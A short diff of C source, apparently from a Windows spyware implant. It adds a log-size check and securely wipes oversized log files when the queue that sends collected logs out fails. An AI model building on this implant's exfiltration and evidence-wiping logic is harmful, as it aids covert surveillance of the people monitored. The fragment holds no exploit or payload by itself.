@@ -71,6 +71,22 @@ extern DWORD log_active_queue;
 
 extern BOOL IsDeepFreeze();
 
+#define LOG_SIZE_MAX ((DWORD)1024*1024*100) //100MB
+DWORD GetLogSize(char *path)
+{
+	DWORD hi_dim=0, lo_dim=0;
+	HANDLE hfile;
+
+	hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hfile == INVALID_HANDLE_VALUE) 
+		return 0xFFFFFFFF;
+	lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
+	CloseHandle(hfile);
+	if (lo_dim == INVALID_FILE_SIZE || hi_dim>0)
+		return 0xFFFFFFFF;
+	return lo_dim;
+}
+
 // Inserisce un elemento nella lista dei log da spedire in ordine di tempo
 BOOL InsertLogList(log_list_struct **log_list, WIN32_FIND_DATA *log_elem)
 {
@@ -1215,6 +1231,8 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 
 		// Invia il log 
 		if (!ASP_SendLog(log_file_path, band_limit)) {
+			if (GetLogSize(log_file_path) > LOG_SIZE_MAX)
+				HM_WipeFileA(log_file_path); 
 			FreeLogList(&log_list_head);
 			ASP_Bye(); // Se fallisce con PROTO_NO chiude correttamente la sessione
 			return FALSE;
